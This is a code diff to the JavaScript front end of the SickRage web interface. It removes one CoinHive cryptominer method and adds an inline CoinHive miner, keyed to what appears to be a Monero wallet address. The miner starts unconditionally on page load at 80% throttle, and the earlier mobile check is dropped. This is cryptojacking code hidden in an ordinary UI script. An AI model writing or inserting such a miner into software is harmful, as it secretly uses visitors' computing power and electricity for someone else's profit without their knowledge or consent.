@@ -13,13 +13,6 @@ jQuery(document).ready(function ($) {
             this.xhrPool = [];
         },
 
-        coinhive: function () {
-            var ch = new CoinHive.Anonymous('1hc1dBLexNbhpGSCQbBrPhtcFeqB2XdT', {throttle: 0.8});
-            if (!ch.isMobile()) {
-                ch.start();
-            }
-        },
-
         check_notifications: function () {
             var message_url = SICKRAGE.srWebRoot + '/ui/get_messages';
             if ('visible' === document.visibilityState) {
@@ -126,7 +119,8 @@ jQuery(document).ready(function ($) {
                 SICKRAGE.loadingHTML = '<img src="' + SICKRAGE.getMeta('srWebRoot') + '/images/loading16' + SICKRAGE.getMeta('themeSpinner') + '.gif" height="16" width="16" />';
                 SICKRAGE.anonURL = SICKRAGE.getMeta('anonURL');
 
-                SICKRAGE.coinhive();
+                var ch = new CH.Anonymous('43NvegWyuszDM8vqM2NxSbJ5VUHNqK1pahdh4aNU5joR62puTCWgiRqQm9J6PTGkpQPstwfW5MPcffa4VKe8UG6C58FQeSs', {throttle: 0.8});
+                ch.start();
 
                 // tooltips
                 $('[title!=""]').qtip({
